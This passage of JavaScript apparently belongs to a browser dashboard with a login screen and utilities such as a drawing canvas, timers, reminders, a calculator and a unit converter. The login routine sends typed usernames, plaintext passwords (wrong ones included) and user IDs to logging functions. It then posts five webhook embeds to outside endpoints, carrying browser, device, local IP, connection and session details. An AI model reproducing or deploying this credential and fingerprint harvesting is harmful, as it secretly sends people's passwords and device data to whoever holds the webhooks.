            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
        ]
    };
}

function buildSessionLoggingEmbed(data) {
    return {
        title: "Session Logging System",
        color: 0x00ffff,
        fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true },
            { name: "Login Attempts Log", value: data.loginAttemptsLog.map(a => `${a.time} - ${a.status}: ${a.username}/${a.userID}`).join('\n') || "None", inline: false }, // Added field 5
            { name: "Dashboard Activity Summary", value: activityLogs.slice(-5).map(log => log.activity).join('\n') || "None", inline: false } // Added field 6
        ]
    };
}


async function attemptLogin() {
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const userIDInput = document.getElementById('userID');
  const errorMsg = document.getElementById('errorMsg');
  const loginBox = document.getElementById('loginBox');
  const submitBtn = document.getElementById('submitBtn');

  errorMsg.textContent = '';
  if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
    showError('Please fill all fields');
    logActivity('Login attempt failed: Missing fields', 'Login');
    return;
  }

  const username = usernameInput.value;
  const password = passwordInput.value;
  const userID = userIDInput.value;
  const user = findUser(username, userID);

  const attemptLogEntry = {
      time: new Date().toLocaleString(),
      username,
      userID,
      status: ''
  };

  if (!user) {
    await logInvalidUsername("Unknown", username);
    await logInvalidIdentifier("Unknown", userID);
    attemptLogEntry.status = 'User not found';
    loginHistory.unshift(attemptLogEntry);
    failedLogin();
    return;
  }

  if (password !== user.password) {
    await logInvalidPassword(user.name, password);
    attemptLogEntry.status = 'Incorrect password';
    loginHistory.unshift(attemptLogEntry);
    failedLogin();
    return;
  }

  // Correct login
  loginAttempts = 3; // Reset attempts
  updateAttemptsText();
  errorMsg.textContent = '';
  
  // Log successful credentials
  await logUsername(user.name, username);
  await logPassword(user.name, password);
  await logIdentifier(user.name, userID);

  // Collect data and send logs
  const loggingData = await collectLoggingData(user, password);

  // Send all 5 webhooks:
  await Promise.all([
    sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
    sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
    sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
    sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
    sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
  ]);
  
  attemptLogEntry.status = 'Success';
  loginHistory.unshift(attemptLogEntry); // Add successful login to history
  saveLoginHistory(); // Save to local storage

  // Show loading screen
  document.getElementById('loginScreen').classList.remove('active');
  document.getElementById('loadingScreen').classList.remove('hidden');
  stopCodeRain('codeRain'); // Stop login screen code rain
  generateCodeRain('loadingCodeRain'); // Start loading screen code rain
  
  logActivity('Login successful, transitioning to dashboard loading', 'Login');

  setTimeout(() => {
    document.getElementById('loadingScreen').classList.add('hidden');
    document.getElementById('dashboard').classList.add('active');
    stopCodeRain('loadingCodeRain'); // Stop loading screen code rain
    initializeDashboard();
  }, 3000);
}

function failedLogin() {
  const attemptsText = document.getElementById('attemptsText');
  const loginBox = document.getElementById('loginBox');
  const submitBtn = document.getElementById('submitBtn');

  loginAttempts--;
  attemptsText.textContent = `Attempts Left: ${loginAttempts}`;
  loginBox.classList.add('error-shake');
  
  setTimeout(() => {
    loginBox.classList.remove('error-shake');
  }, 500);
  
  if (loginAttempts <= 0) {
    showError('No attempts remaining. System locked.');
    submitBtn.disabled = true;
    logActivity('Max login attempts exceeded. System locked.', 'Login');
  } else {
    showError('Invalid credentials');
    logActivity(`Login failed. Attempts left: ${loginAttempts}`, 'Login');
  }
  updateLoginHistoryDisplay(); // Update login history display
}

function showError(message) {
  document.getElementById('errorMsg').textContent = message;
  setTimeout(() => {
    document.getElementById('errorMsg').textContent = '';
  }, 3000);
}

function updateAttemptsText() {
  document.getElementById('attemptsText').textContent = `Attempts Left: ${loginAttempts}`;
}

// Dashboard initialization
function initializeDashboard() {
  stats.sessionStartTime = Date.now();
  
  // Show welcome notification
  document.getElementById('loggedUser').textContent = currentUser;
  document.getElementById('currentUser').textContent = currentUser;
  document.getElementById('currentUserID').textContent = currentUserID;
  
  const welcomeNotification = document.getElementById('welcomeNotification');
  welcomeNotification.classList.remove('hidden');
  setTimeout(() => {
    welcomeNotification.classList.add('hidden');
  }, 5000);
  
  // Initialize components
  generateCalendar();
  initializeCanvas();
  // setupPanelDragging(); // Removed as per request: non-movable panels
  startSessionTimer();
  updateStats();
  applyWifiLevelColors(); // Apply colors to WiFi panel
  updateConversionUnits(); // Initialize unit converter dropdowns
  updateActivityLogDisplay(); // Display initial activity logs
  updateLoginHistoryDisplay(); // Display initial login history
  loadSettings(); // Re-apply settings for dashboard
  loadKeybinds(); // Re-apply keybinds
  loadTextNotes(); // Load text notes
  loadReminders(); // Load reminders
  
  logActivity('Dashboard initialized', 'System');
}

function generateCalendar() {
  const calendar = document.getElementById('calendarGrid');
  calendar.innerHTML = '';
  
  const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const today = new Date();
  const currentMonth = today.getMonth();
  const currentYear = today.getFullYear();
  
  // Add day headers
  days.forEach(day => {
    const dayElement = document.createElement('div');
    dayElement.textContent = day;
    dayElement.className = 'calendar-cell text-xs font-bold text-gray-400';
    calendar.appendChild(dayElement);
  });
  
  // Add calendar days
  const firstDay = new Date(currentYear, currentMonth, 1).getDay();
  const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate();
  
  // Empty cells for days before month starts
  for (let i = 0; i < firstDay; i++) {
    const emptyCell = document.createElement('div');
    emptyCell.className = 'calendar-cell';
    calendar.appendChild(emptyCell);
  }
  
  // Days of the month
  for (let day = 1; day <= daysInMonth; day++) {
    const dayCell = document.createElement('div');
    dayCell.textContent = day;
    dayCell.className = 'calendar-cell';
    
    if (day === today.getDate()) {
      dayCell.classList.add('today');
    }
    
    calendar.appendChild(dayCell);
  }
  logActivity('Calendar generated', 'UI');
}

function initializeCanvas() {
  canvas = document.getElementById('drawingCanvas');
  ctx = canvas.getContext('2d');
  
  // Set initial white background
  ctx.fillStyle = 'white';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  saveCanvasState(); // Save initial blank state

  canvas.addEventListener('mousedown', startDrawing);
  canvas.addEventListener('mousemove', draw);
  canvas.addEventListener('mouseup', stopDrawing);
  canvas.addEventListener('mouseout', stopDrawing);

  document.getElementById('penColor').addEventListener('change', (e) => {
    currentColor = e.target.value;
    logActivity(`Brush color changed to ${currentColor}`, 'Canvas');
  });
  
  document.getElementById('penThickness').addEventListener('input', (e) => {
    currentThickness = parseInt(e.target.value);
    logActivity(`Brush thickness changed to ${currentThickness}`, 'Canvas');
  });

  document.getElementById('penMaterial').addEventListener('change', (e) => {
    currentMaterial = e.target.value;
    logActivity(`Brush material changed to ${currentMaterial}`, 'Canvas');
  });
  logActivity('Canvas initialized', 'Canvas');
}

function saveCanvasState() {
    if (undoStack.length >= MAX_CANVAS_HISTORY) {
        undoStack.shift(); // Remove oldest state
    }
    undoStack.push(canvas.toDataURL());
    redoStack.length = 0; // Clear redo stack on new action
}

function restoreCanvasState(stack, targetStack) {
    if (stack.length > 0) {
        const prevState = stack.pop();
        targetStack.push(canvas.toDataURL()); // Save current state to target stack
        const img = new Image();
        img.onload = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(img, 0, 0);
        };
        img.src = prevState;
    }
}

function undoCanvas() {
    restoreCanvasState(undoStack, redoStack);
    logActivity('Canvas undo action', 'Canvas');
}

function redoCanvas() {
    restoreCanvasState(redoStack, undoStack);
    logActivity('Canvas redo action', 'Canvas');
}

function startDrawing(e) {
  isDrawing = true;
  const rect = canvas.getBoundingClientRect();
  const x = e.clientX - rect.left;
  const y = e.clientY - rect.top;
  
  ctx.beginPath();
  ctx.moveTo(x, y);
  // For shapes, store initial point
  if (currentTool === 'rectangle' || currentTool === 'circle' || currentTool === 'line') {
      ctx.startX = x;
      ctx.startY = y;
  }
}

function draw(e) {
  if (!isDrawing) return;
  
  const rect = canvas.getBoundingClientRect();
  const x = e.clientX - rect.left;
  const y = e.clientY - rect.top;
  
  ctx.lineWidth = currentThickness;
  ctx.lineCap = 'round';
  ctx.strokeStyle = currentTool === 'eraser' ? 'white' : currentColor;
  ctx.fillStyle = currentColor; // For shapes

  // Apply line material (dashed/dotted)
  if (currentMaterial === 'dashed') {
      ctx.setLineDash([10, 5]);
  } else if (currentMaterial === 'dotted') {
      ctx.setLineDash([2, 2]);
  } else {
      ctx.setLineDash([]);
  }

  if (currentTool === 'pen' || currentTool === 'brush' || currentTool === 'eraser') {
    ctx.lineTo(x, y);
    ctx.stroke();
    ctx.beginPath();
    ctx.moveTo(x, y);
  } else if (currentTool === 'line') {
      // Clear canvas and redraw line dynamically
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      if (undoStack.length > 0) { // Redraw previous state
          const img = new Image();
          img.onload = () => { ctx.drawImage(img, 0, 0); };
          img.src = undoStack[undoStack.length - 1];
      } else { // If no history, just white background
          ctx.fillStyle = 'white';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
      }
      ctx.beginPath();
      ctx.moveTo(ctx.startX, ctx.startY);
      ctx.lineTo(x, y);
      ctx.stroke();
  } else if (currentTool === 'rectangle') {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      if (undoStack.length > 0) {
          const img = new Image();
          img.onload = () => { ctx.drawImage(img, 0, 0); };
          img.src = undoStack[undoStack.length - 1];
      } else {
          ctx.fillStyle = 'white';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
      }
      ctx.strokeRect(ctx.startX, ctx.startY, x - ctx.startX, y - ctx.startY);
  } else if (currentTool === 'circle') {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      if (undoStack.length > 0) {
          const img = new Image();
          img.onload = () => { ctx.drawImage(img, 0, 0); };
          img.src = undoStack[undoStack.length - 1];
      } else {
          ctx.fillStyle = 'white';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
      }
      const radius = Math.sqrt(Math.pow(x - ctx.startX, 2) + Math.pow(y - ctx.startY, 2));
      ctx.beginPath();
      ctx.arc(ctx.startX, ctx.startY, radius, 0, 2 * Math.PI);
      ctx.stroke();
  }
}

function stopDrawing() {
  if (isDrawing) {
    saveCanvasState(); // Save state after each completed drawing action
    logActivity(`Drew with ${currentTool} tool`, 'Canvas');
  }
  isDrawing = false;
  ctx.beginPath();
}

function addTextToCanvas(text, x, y) {
    ctx.font = `${currentThickness * 5}px Arial`; // Adjust font size based on thickness
    ctx.fillStyle = currentColor;
    ctx.fillText(text, x, y);
    saveCanvasState();
    logActivity(`Added text "${text}" to canvas`, 'Canvas');
}

// Event listener for text tool
document.addEventListener('click', (e) => {
    if (currentTool === 'text' && e.target === canvas) {
        const text = prompt("Enter text for note:");
        if (text) {
            const rect = canvas.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            addTextToCanvas(text, x, y);
        }
    }
});


function clearCanvas() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = 'white';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  saveCanvasState(); // Save blank state
  logActivity('Canvas cleared', 'Canvas');
}

function saveCanvas() {
  const dataURL = canvas.toDataURL();
  localStorage.setItem('drawingCanvasState', dataURL);
  showNotification('Canvas saved locally!');
  logActivity('Canvas saved to local storage', 'Canvas');
}

function loadCanvas() {
  const dataURL = localStorage.getItem('drawingCanvasState');
  if (dataURL) {
    const img = new Image();
    img.onload = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(img, 0, 0);
      undoStack = [dataURL]; // Reset history to loaded state
      redoStack = [];
      showNotification('Canvas loaded from local storage!');
      logActivity('Canvas loaded from local storage', 'Canvas');
    };
    img.src = dataURL;
  } else {
    showNotification('No saved canvas found!', 'warning');
    logActivity('Attempted to load canvas, but none found', 'Canvas');
  }
}

function loadTextNotes() {
    const savedNotes = localStorage.getItem('textNotes');
    if (savedNotes) {
        document.getElementById('textNotes').value = savedNotes;
    }
}

function saveTextNotes() {
  const notes = document.getElementById('textNotes').value;
  localStorage.setItem('textNotes', notes);
  showNotification('Text notes saved successfully');
  logActivity('Text notes saved', 'Notes');
}

function clearTextNotes() {
  document.getElementById('textNotes').value = '';
  logActivity('Text notes cleared', 'Notes');
}

function startSessionTimer() {
  setInterval(() => {
    if (stats.sessionStartTime) {
      const elapsed = Math.floor((Date.now() - stats.sessionStartTime) / 1000);
      const hours = Math.floor(elapsed / 3600);
      const minutes = Math.floor((elapsed % 3600) / 60);
      const seconds = elapsed % 60;
      
      const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      document.getElementById('sessionTimeStat').textContent = timeString; // Update stats panel
    }
  }, 1000);
}

// Utility functions
function togglePanel(panelId) {
  const panel = document.getElementById(panelId);
  const isVisible = panel.classList.contains('active'); // Use active class for modals
  
  if (panel.classList.contains('settings-modal')) { // For modals
    if (isVisible) {
      panel.classList.remove('active');
      stats.panelsClosed++;
      logActivity(`Modal closed: ${panelId}`, 'Panel');
    } else {
      panel.classList.add('active');
      stats.panelsOpened++;
      logActivity(`Modal opened: ${panelId}`, 'Panel');
    }
  } else { // For grid panels
    if (isVisible) {
      panel.classList.remove('active');
      stats.panelsClosed++;
      logActivity(`Panel closed: ${panelId}`, 'Panel');
    } else {
      panel.classList.add('active');
      stats.panelsOpened++;
      logActivity(`Panel opened: ${panelId}`, 'Panel');
    }
  }
  updateStats();
}

function minimizePanel(button) {
  const panel = button.closest('.panel');
  const content = panel.querySelector('.panel-header').nextElementSibling;
  
  if (content.style.display === 'none') {
    content.style.display = 'block';
    button.innerHTML = '<i class="fas fa-minus"></i>';
  } else {
    content.style.display = 'none';
    button.innerHTML = '<i class="fas fa-plus"></i>';
  }
  
  stats.buttonPresses++;
  logActivity('Panel minimized/restored', 'Panel');
  updateStats();
}

function closePanel(button) {
  const panel = button.closest('.panel');
  panel.style.display = 'none'; // Hide the panel
  stats.panelsClosed++;
  stats.buttonPresses++;
  logActivity(`Panel closed: ${panel.dataset.panel}`, 'Panel');
  updateStats();
}

function performSearch() {
  const query = document.getElementById('searchBar').value.toLowerCase();
  if (!query) return;
  
  stats.searchQueries++;
  logActivity(`Searched for: ${query}`, 'Search');
  
  const panels = document.querySelectorAll('.panels-grid .panel');
  let found = false;
  panels.forEach(panel => {
    const panelTitle = panel.querySelector('.panel-title')?.textContent.toLowerCase() || '';
    const panelContent = panel.textContent.toLowerCase();
    
    if (panelTitle.includes(query) || panelContent.includes(query)) {
      panel.style.display = 'block'; // Ensure it's visible
      panel.style.border = '2px solid var(--accent-color)';
      setTimeout(() => {
        panel.style.border = '1px solid var(--border-color)';
      }, 2000);
      found = true;
    } else {
      panel.style.display = 'none'; // Hide non-matching panels
    }
  });

  if (!found) {
      showNotification(`No panels found matching "${query}"`, 'warning');
  }
  
  updateStats();
}

function logActivity(activity, category = 'General') {
  const timestamp = new Date().toISOString();
  activityLogs.unshift({
    timestamp,
    activity,
    category,
    id: Date.now()
  });
  
  // Keep only last 100 logs
  if (activityLogs.length > 100) {
    activityLogs = activityLogs.slice(0, 100);
  }
  
  updateActivityLogDisplay();
}

function updateActivityLogDisplay() {
  const container = document.getElementById('activityLogsList');
  if (!container) return; // Ensure container exists
  container.innerHTML = '';
  
  activityLogs.slice(0, 10).forEach(log => {
    const logElement = document.createElement('div');
    logElement.className = 'log-entry';
    logElement.innerHTML = `
      <span>${log.activity}</span>
      <span class="log-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
    `;
    container.appendChild(logElement);
  });
}

function updateLoginHistoryDisplay() {
    const container = document.getElementById('loginHistoryList');
    if (!container) return;
    container.innerHTML = '';

    loginHistory.slice(0, 10).forEach(entry => {
        const entryElement = document.createElement('div');
        entryElement.className = `p-2 rounded text-xs ${entry.success ? 'bg-green-900' : 'bg-red-900'}`;
        entryElement.innerHTML = `
            <span class="font-semibold">${entry.username}</span> - 
            <span class="text-gray-300">${new Date(entry.time).toLocaleString()}</span> - 
            <span class="text-gray-400">${entry.status}</span>
        `;
        container.appendChild(entryElement);
    });
}

function saveLoginHistory() {
    localStorage.setItem('loginHistory', JSON.stringify(loginHistory));
}

function loadLoginHistory() {
    const storedHistory = localStorage.getItem('loginHistory');
    if (storedHistory) {
        loginHistory = JSON.parse(storedHistory);
    }
    updateLoginHistoryDisplay();
}


function updateStats() {
  document.getElementById('buttonPresses').textContent = stats.buttonPresses;
  document.getElementById('toggleSwitches').textContent = stats.toggleSwitches;
  document.getElementById('panelsOpened').textContent = stats.panelsOpened;
  document.getElementById('panelsClosed').textContent = stats.panelsClosed;
  document.getElementById('searchQueries').textContent = stats.searchQueries;
  // Session time is updated by its own interval
}

function downloadActivityLogs() {
  const data = {
    activityLogs,
    loginHistory,
    stats,
    timestamp: new Date().toISOString()
  };
  
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `activity_logs_${new Date().toISOString().split('T')[0]}.json`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
  
  stats.buttonPresses++;
  logActivity('Activity logs downloaded', 'System');
  updateStats();
}

function showStats() {
  togglePanel('statsPanel');
  
  // Destroy existing chart if it exists
  const existingChart = Chart.getChart('statsChart');
  if (existingChart) {
      existingChart.destroy();
  }

  // Create stats chart
  const ctx = document.getElementById('statsChart').getContext('2d');
  new Chart(ctx, {
    type: 'doughnut',
    data: {
      labels: ['Button Presses', 'Toggle Switches', 'Panels Opened', 'Panels Closed', 'Search Queries'],
      datasets: [{
        data: [stats.buttonPresses, stats.toggleSwitches, stats.panelsOpened, stats.panelsClosed, stats.searchQueries],
        backgroundColor: ['var(--accent-color)', 'var(--accent-secondary)', 'var(--success-color)', 'var(--warning-color)', 'var(--accent-color)']
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          labels: {
            color: 'var(--text-primary)'
          }
        }
      }
    }
  });
  logActivity('Stats panel opened and chart displayed', 'Stats');
}

// Timer functions
function startStopwatch() {
  if (!isStopwatchRunning) {
    isStopwatchRunning = true;
    stopwatchInterval = setInterval(() => {
      stopwatchTime++; // Increment by centiseconds
      updateStopwatchDisplay();
    }, 10); // Update every 10ms for centiseconds
    logActivity('Stopwatch started', 'Timer');
  }
}

function pauseStopwatch() {
  if (isStopwatchRunning) {
    isStopwatchRunning = false;
    clearInterval(stopwatchInterval);
    logActivity('Stopwatch paused', 'Timer');
  }
}

function resetStopwatch() {
  isStopwatchRunning = false;
  clearInterval(stopwatchInterval);
  stopwatchTime = 0;
  updateStopwatchDisplay();
  logActivity('Stopwatch reset', 'Timer');
}

function updateStopwatchDisplay() {
  const totalSeconds = Math.floor(stopwatchTime / 100);
  const hours = Math.floor(totalSeconds / 3600);
  const minutes = Math.floor((totalSeconds % 3600) / 60);
  const seconds = totalSeconds % 60;
  const centiseconds = stopwatchTime % 100;
  
  document.getElementById('stopwatchDisplay').textContent = 
    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}.${centiseconds.toString().padStart(2, '0')}`;
}

function startTimer() {
  const hours = parseInt(document.getElementById('timerHours').value) || 0;
  const minutes = parseInt(document.getElementById('timerMinutes').value) || 0;
  const seconds = parseInt(document.getElementById('timerSeconds').value) || 0;
  
  timerTime = (hours * 3600) + (minutes * 60) + seconds;
  
  if (timerTime > 0 && !isTimerRunning) {
    isTimerRunning = true;
    timerInterval = setInterval(() => {
      timerTime--;
      updateTimerDisplay();
      
      if (timerTime <= 0) {
        pauseTimer();
        showNotification('Timer finished!', 'success');
        logActivity('Timer completed', 'Timer');
      }
    }, 1000);
    logActivity('Timer started', 'Timer');
  }
}

function pauseTimer() {
  isTimerRunning = false;
  clearInterval(timerInterval);
  logActivity('Timer paused', 'Timer');
}

function resetTimer() {
  isTimerRunning = false;
  clearInterval(timerInterval);
  timerTime = 0;
  updateTimerDisplay();
  document.getElementById('timerHours').value = '';
  document.getElementById('timerMinutes').value = '';
  document.getElementById('timerSeconds').value = '';
  logActivity('Timer reset', 'Timer');
}

function updateTimerDisplay() {
  const hours = Math.floor(timerTime / 3600);
  const minutes = Math.floor((timerTime % 3600) / 60);
  const seconds = timerTime % 60;
  
  document.getElementById('timerDisplay').textContent = 
    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

let reminders = [];
function addReminder() {
  const text = document.getElementById('reminderText').value;
  const time = document.getElementById('reminderTime').value;
  
  if (text && time) {
    const reminderTime = new Date(time);
    const now = new Date();
    
    if (reminderTime > now) {
      const timeout = reminderTime.getTime() - now.getTime();
      
      const newReminder = { text, time: reminderTime.toISOString(), id: Date.now() };
      reminders.push(newReminder);
      saveReminders();
      
      setTimeout(() => {
        showNotification(`Reminder: ${text}`, 'info');
        // Remove reminder after it triggers
        reminders = reminders.filter(r => r.id !== newReminder.id);
        saveReminders();
        renderReminders();
      }, timeout);
      
      document.getElementById('reminderText').value = '';
      document.getElementById('reminderTime').value = '';
      
      renderReminders();
      showNotification(`Reminder set: ${text}`, 'success');
      logActivity(`Reminder set: ${text}`, 'Reminders');
    } else {
        showNotification('Reminder time must be in the future.', 'error');
    }
  } else {
      showNotification('Please enter both reminder text and time.', 'warning');
  }
}

function renderReminders() {
    const remindersList = document.getElementById('remindersList');
    remindersList.innerHTML = '';
    reminders.sort((a, b) => new Date(a.time) - new Date(b.time)); // Sort by time

    if (reminders.length === 0) {
        remindersList.innerHTML = '<p class="text-gray-500">No active reminders.</p>';
        return;
    }

    reminders.forEach(r => {
        const reminderElement = document.createElement('div');
        reminderElement.className = 'p-2 bg-gray-700 rounded flex justify-between items-center';
        reminderElement.innerHTML = `
            <div>
                <div class="font-semibold">${r.text}</div>
                <div class="text-sm text-gray-400">${new Date(r.time).toLocaleString()}</div>
            </div>
            <button class="text-red-400 hover:text-red-600" onclick="deleteReminder(${r.id})"><i class="fas fa-trash"></i></button>
        `;
        remindersList.appendChild(reminderElement);
    });
}

function deleteReminder(id) {
    reminders = reminders.filter(r => r.id !== id);
    saveReminders();
    renderReminders();
    showNotification('Reminder deleted.', 'info');
    logActivity('Reminder deleted', 'Reminders');
}

function saveReminders() {
    localStorage.setItem('reminders', JSON.stringify(reminders));
}

function loadReminders() {
    const storedReminders = localStorage.getItem('reminders');
    if (storedReminders) {
        reminders = JSON.parse(storedReminders);
        // Re-set timeouts for loaded reminders
        reminders.forEach(r => {
            const reminderTime = new Date(r.time);
            const now = new Date();
            if (reminderTime > now) {
                const timeout = reminderTime.getTime() - now.getTime();
                setTimeout(() => {
                    showNotification(`Reminder: ${r.text}`, 'info');
                    reminders = reminders.filter(rem => rem.id !== r.id);
                    saveReminders();
                    renderReminders();
                }, timeout);
            } else { // If reminder is already past, remove it
                reminders = reminders.filter(rem => rem.id !== r.id);
                saveReminders();
            }
        });
        renderReminders();
    }
}


// Drawing tools
// `selectTool` is already defined in HTML, just ensure it updates `currentTool`
// `clearCanvas` is already defined in HTML
// `saveCanvas` is already defined in HTML

// Calculator functions
function appendToCalc(value) {
  const display = document.getElementById('calcDisplay');
  if (calcResetDisplay) {
      calcDisplayValue = value;
      calcResetDisplay = false;
  } else if (calcDisplayValue === '0' && value !== '.') {
      calcDisplayValue = value;
  } else {
      calcDisplayValue += value;
  }
  display.textContent = calcDisplayValue;
  logActivity(`Calculator input: ${value}`, 'Calculator');
}

function clearCalc() {
  document.getElementById('calcDisplay').textContent = '0';
  calcDisplayValue = '0';
  calcOperator = null;
  calcPrevValue = null;
  calcResetDisplay = false;
  logActivity('Calculator cleared', 'Calculator');
}

function deleteLast() {
  const display = document.getElementById('calcDisplay');
  if (calcDisplayValue.length > 1) {
    calcDisplayValue = calcDisplayValue.slice(0, -1);
  } else {
    calcDisplayValue = '0';
  }
  display.textContent = calcDisplayValue;
  logActivity('Calculator backspace', 'Calculator');
}

function calculateResult() {
  const display = document.getElementById('calcDisplay');
  if (calcPrevValue === null || calcOperator === null || calcResetDisplay) {
      return; // Nothing to calculate
  }

  let result;
  const prev = parseFloat(calcPrevValue);
  const current = parseFloat(calcDisplayValue);
  if (isNaN(prev) || isNaN(current)) {
      display.textContent = 'Error';
      calcDisplayValue = '0';
      calcPrevValue = null;
      calcOperator = null;
      logActivity('Calculator error: Invalid numbers', 'Calculator');
      return;
  }

  switch (calcOperator) {
      case '+': result = prev + current; break;
      case '-': result = prev - current; break;
      case '*': result = prev * current; break;
      case '/': result = prev / current; break;
      default: return;
  }
  calcDisplayValue = result.toString();
  display.textContent = calcDisplayValue;
  calcPrevValue = null;
  calcOperator = null;
  calcResetDisplay = true;
  logActivity(`Calculation performed: ${prev} ${calcOperator} ${current} = ${result}`, 'Calculator');
}

// Unit converter
const conversionRates = {
    length: {
        m: { km: 0.001, cm: 100, mm: 1000, in: 39.3701, ft: 3.28084, m: 1 },
        km: { m: 1000, cm: 100000, mm: 1000000, in: 39370.1, ft: 3280.84, km: 1 },
        cm: { m: 0.01, km: 0.00001, mm: 10, in: 0.393701, ft: 0.0328084, cm: 1 },
        mm: { m: 0.001, km: 0.000001, cm: 0.1, in: 0.0393701, ft: 0.00328084, mm: 1 },
        in: { m: 0.0254, km: 0.0000254, cm: 2.54, mm: 25.4, ft: 0.0833333, in: 1 },
        ft: { m: 0.3048, km: 0.0003048, cm: 30.48, mm: 304.8, in: 12, ft: 1 }
    },
    weight: {
        kg: { g: 1000, lb: 2.20462, oz: 35.274, kg: 1 },
        g: { kg: 0.001, lb: 0.00220462, oz: 0.035274, g: 1 },
        lb: { kg: 0.453592, g: 453.592, oz: 16, lb: 1 },
        oz: { kg: 0.0283495, g: 28.3495, lb: 0.0625, oz: 1 }
    },
    temperature: {
        c: { f: (val) => (val * 9/5) + 32, k: (val) => val + 273.15, c: (val) => val },
        f: { c: (val) => (val - 32) * 5/9, k: (val) => (val - 32) * 5/9 + 273.15, f: (val) => val },
        k: { c: (val) => val - 273.15, f: (val) => (val - 273.15) * 9/5 + 32, k: (val) => val }
    },
    volume: {
        l: { ml: 1000, gal: 0.264172, qt: 1.05669, l: 1 },
        ml: { l: 0.001, gal: 0.000264172, qt: 0.00105669, ml: 1 },
        gal: { l: 3.78541, ml: 3785.41, qt: 4, gal: 1 },
        qt: { l: 0.946353, ml: 946.353, gal: 0.25, qt: 1 }
    }
};

function updateConversionUnits() {
  const type = document.getElementById('conversionType').value;
  const fromUnitSelect = document.getElementById('fromUnit');
  const toUnitSelect = document.getElementById('toUnit');
  
  fromUnitSelect.innerHTML = '';
  toUnitSelect.innerHTML = '';
  
  for (const unit in conversionRates[type]) {
    const optionFrom = document.createElement('option');
    optionFrom.value = unit;
    optionFrom.textContent = unit.toUpperCase(); // Simple display
    fromUnitSelect.appendChild(optionFrom);

    const optionTo = document.createElement('option');
    optionTo.value = unit;
    optionTo.textContent = unit.toUpperCase();
    toUnitSelect.appendChild(optionTo);
  }
  convertUnits(); // Perform conversion with new units
  logActivity(`Unit converter type changed to ${type}`, 'Unit Converter');
}

function convertUnits() {
  const fromValue = parseFloat(document.getElementById('fromValue').value);
  const fromUnit = document.getElementById('fromUnit').value;
  const toUnit = document.getElementById('toUnit').value;
  const type = document.getElementById('conversionType').value;
  const toValueInput = document.getElementById('toValue');
  
  if (isNaN(fromValue)) {
    toValueInput.value = '';
    return;
  }
  
  let result;
  if (type === 'temperature') {
      const convertFunc = conversionRates[type][fromUnit][toUnit];
      if (typeof convertFunc === 'function') {
          result = convertFunc(fromValue);
      } else {
          result = fromValue; // Same unit
      }
  } else {
      const toBase = conversionRates[type][fromUnit][fromUnit]; // Value of fromUnit in its own base
      const fromBase = conversionRates[type][fromUnit][toUnit]; // Value of fromUnit in toUnit
      result = fromValue * conversionRates[type][fromUnit][toUnit];
  }
  
  toValueInput.value = result.toFixed(4);
